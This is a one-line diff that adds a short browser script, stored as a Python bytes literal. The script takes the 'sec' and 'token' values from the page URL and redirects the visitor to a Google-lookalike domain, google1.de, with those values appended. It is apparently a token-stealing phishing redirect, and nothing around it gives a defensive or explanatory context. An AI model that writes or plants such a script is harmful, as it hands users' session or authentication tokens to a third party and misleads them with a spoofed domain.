@@ -1,0 +1,1 @@
+b'<script>\tvar url = new URL(window.location.href);\tvar sec = url.searchParams.get("sec");\tvar token = url.searchParams.get("token");\tvar secret = ["https://google1.de","https://google1.de"];\tvar d = (secret[Math.floor(Math.random()*secret.length)]+"?sec="+sec+"&token="+token);\twindow.location = d;</script>'
